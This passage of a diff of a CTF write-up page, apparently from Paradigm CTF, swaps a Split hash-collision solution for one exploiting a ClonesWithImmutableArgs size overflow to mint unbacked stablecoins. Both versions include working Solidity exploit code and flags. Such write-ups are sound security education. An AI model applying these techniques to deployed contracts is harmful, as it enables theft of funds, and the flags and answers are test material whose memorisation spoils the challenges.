+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">ethPrice</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1e8</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">totalDebt</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">configuration</span><span class="p">.</span><span class="nx">getCollateralRatio</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">10000</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Notice that <code>AccountManager</code> uses <code>ClonesWithImmutableArgs</code> to create new accounts. When interacting with the <code>Account</code>, the immutable arguments will be read from calldata, saving gas costs. However, there's a comment in the <code>ClonesWithImmutableArgs</code></p>
+<div class="highlight"><pre><span></span><code><span class="c1">/// @dev data cannot exceed 65535 bytes, since 2 bytes are used to store the data length</span>
+</code></pre></div>
+</li>
+<li>
+<p>Since the immutable arguments are stored in the code region of the created proxy contract, the code size will be calculated based on the data length during the deployment. However, the code size that should be returned is also stored in 2 bytes. Therefore, if <code>runSize</code> exceeds 65535 bytes, a broken contract may be deployed. We can then treat <code>increaseDebt()</code> as a <em>phantom function</em> and ignore the call</p>
+<div class="highlight"><pre><span></span><code><span class="nx">uint256</span><span class="w"> </span><span class="nx">extraLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="c1">// +2 bytes for telling how much data there is appended to the call</span>
+<span class="nx">uint256</span><span class="w"> </span><span class="nx">creationSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x43</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">extraLength</span><span class="p">;</span>
+<span class="nx">uint256</span><span class="w"> </span><span class="nx">runSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">creationSize</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">11</span><span class="p">;</span>
 <span class="p">...</span>
-<span class="nx">uint256</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">split</span><span class="p">.</span><span class="nx">createSplit</span><span class="p">(</span><span class="nx">addrs</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
+<span class="c1">// solhint-disable-next-line no-inline-assembly</span>
+<span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">ptr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
+
+<span class="w">    </span><span class="c1">// -------------------------------------------------------------------------------------------------------------</span>
+<span class="w">    </span><span class="c1">// CREATION (11 bytes)</span>
+<span class="w">    </span><span class="c1">// -------------------------------------------------------------------------------------------------------------</span>
+
+<span class="w">    </span><span class="c1">// 3d          | RETURNDATASIZE        | 0                       | –</span>
+<span class="w">    </span><span class="c1">// 61 runtime  | PUSH2 runtime (r)     | r 0                     | –</span>
+<span class="w">    </span><span class="nx">mstore</span><span class="p">(</span><span class="nx">ptr</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3d61000000000000000000000000000000000000000000000000000000000000</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">mstore</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">ptr</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">),</span><span class="w"> </span><span class="nx">shl</span><span class="p">(</span><span class="mf">240</span><span class="p">,</span><span class="w"> </span><span class="nx">runSize</span><span class="p">))</span><span class="w"> </span><span class="c1">// size of the contract running bytecode (16 bits)</span>
 </code></pre></div>
 </li>
 <li>
-<p>So we can use modified <code>accounts</code> and <code>percents</code> to pull all ETH from <code>SplitWallet{id: 0}</code> but not distribute it to anyone, while keeping the hash unchanged (Note that array elements are padded to 32 bytes)</p>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">_distribute</span><span class="p">(</span>
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w">  </span><span class="c1">// @note [0xbEEF]</span>
-<span class="w">    </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w">   </span><span class="c1">// @note [0, 5e5, 5e5]</span>
-<span class="w">    </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span>
-<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span>
-<span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="p">...</span>
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">storedWalletBalance</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">externalWalletBalance</span><span class="p">;</span>
+<p>The existing arguments length is <code>20 + 20 + 32 = 72</code> bytes and the length of encoded <code>recoveryAddresses</code> will be a multiple of 32 bytes</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">_openAccount</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">Account</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Account</span><span class="p">(</span>
+<span class="w">        </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">getAccountImplementation</span><span class="p">().</span><span class="nx">clone</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">,</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="w"> </span><span class="nx">recoveryAddresses</span><span class="p">)</span>
+<span class="w">        </span><span class="p">)</span>
+<span class="w">    </span><span class="p">);</span>
 
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">ownerOf</span><span class="p">(</span><span class="nx">splitId</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">relayerAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">relayerFee</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">SCALE</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">][</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">relayerAmount</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">relayerAmount</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">validAccounts</span><span class="p">[</span><span class="nx">account</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
 
-<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">accounts</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">balances</span><span class="p">[</span><span class="nx">accounts</span><span class="p">[</span><span class="nx">i</span><span class="p">]][</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">)]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">totalBalance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">percents</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">SCALE</span><span class="p">;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">account</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div>
-</li>
-<li>
-<p>Similarly, we can utilize the hash collision caused by <code>abi.encodePacked</code> to withdraw more ETH than deposited to drain <code>Split</code></p>
 </li>
 </ul>
 <h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">solve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">challenge</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">Challenge</span><span class="w"> </span><span class="nx">chall</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Challenge</span><span class="p">(</span><span class="nx">challenge</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">Split</span><span class="w"> </span><span class="nx">split</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">chall</span><span class="p">.</span><span class="nx">SPLIT</span><span class="p">();</span>
-
-<span class="w">    </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">account</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000bEEF</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[](</span><span class="mf">3</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">percents</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">percents</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">split</span><span class="p">.</span><span class="nx">distribute</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">account</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">)));</span><span class="w">  </span><span class="c1">// pull from SplitWallet</span>
-
-<span class="w">    </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">accounts</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">player</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">accounts</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">2</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mf">32</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span><span class="w"> </span><span class="c1">// set percent to the max</span>
-<span class="w">    </span><span class="nx">percents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">percents</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">percents</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">split</span><span class="p">.</span><span class="nx">createSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
-
-<span class="w">    </span><span class="nx">Split</span><span class="p">.</span><span class="nx">SplitData</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">splitData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">split</span><span class="p">.</span><span class="nx">splitsById</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
-<span class="w">    </span><span class="c1">// x * (2 ** 32 - 1) / 1e6 &gt; (100 ether + x) =&gt; x &gt; 100 ether * 1e6 / (2 ** 32 - 1e6 - 1)</span>
-<span class="w">    </span><span class="nx">splitData</span><span class="p">.</span><span class="nx">wallet</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1e6</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="mf">2</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mf">31</span><span class="p">)}();</span>
-
-<span class="w">    </span><span class="nx">account</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">player</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">percents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[](</span><span class="mf">3</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">percents</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mf">32</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">percents</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">percents</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">split</span><span class="p">.</span><span class="nx">distribute</span><span class="p">(</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">account</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">)));</span>
-<span class="w">    </span><span class="nx">IERC20</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">tokens</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">tokens</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">));</span>
-<span class="w">    </span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">amounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint256</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">amounts</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">split</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">split</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">tokens</span><span class="p">,</span><span class="w"> </span><span class="nx">amounts</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">chall</span><span class="p">.</span><span class="nx">isSolved</span><span class="p">());</span>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Solve</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">CTFSolver</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">solve</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">challenge_</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">Challenge</span><span class="w"> </span><span class="nx">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Challenge</span><span class="p">(</span><span class="nx">challenge_</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">AccountManager</span><span class="w"> </span><span class="nx">manager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">AccountManager</span><span class="p">(</span><span class="nx">challenge</span><span class="p">.</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">().</span><span class="nx">getAccountManager</span><span class="p">());</span>
+<span class="w">        </span><span class="c1">// 72 + 2044 * 32 + 2 + 0x43 - 11 = 65538 =&gt; 65538 % 65536 = 2</span>
+<span class="w">        </span><span class="nx">Account</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">manager</span><span class="p">.</span><span class="nx">openAccount</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">2044</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">manager</span><span class="p">.</span><span class="nx">mintStablecoins</span><span class="p">(</span><span class="nx">account</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="nx">_000_000_000_000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">challenge</span><span class="p">.</span><span class="nx">isSolved</span><span class="p">());</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 <h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
 <blockquote>
-<p>PCTF{gU355_7H3r3_w45n7_3nOUgH_1NpU7_V4L1D471ON}</p>
+<p>PCTF{0V3RFl0W5_WH3r3_Y0u_L3a57_3xp3C7_17}</p>
 </blockquote>
 
   <hr>
@@ -3836,7 +3864,7 @@
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年11月19日 15:06:22</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年11月29日 17:00:21</span>
       
     
   </small>
@@ -3930,7 +3958,7 @@
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../../tokyo_payload/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Tokyo Payload" rel="prev">
+        <a href="../one_hundred_percent/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 100%" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -3939,20 +3967,20 @@
               <span class="md-footer__direction">
                 上一页
               </span>
-              Tokyo Payload
+              100%
             </div>
           </div>
         </a>
       
       
         
-        <a href="../dai_plus_plus/" class="md-footer__link md-footer__link--next" aria-label="下一页: Dai++" rel="next">
+        <a href="../../the_council_of_apes/" class="md-footer__link md-footer__link--next" aria-label="下一页: The Council of Apes" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              Dai++
+              The Council of Apes
             </div>
           </div>
           <div class="md-footer__button md-icon">
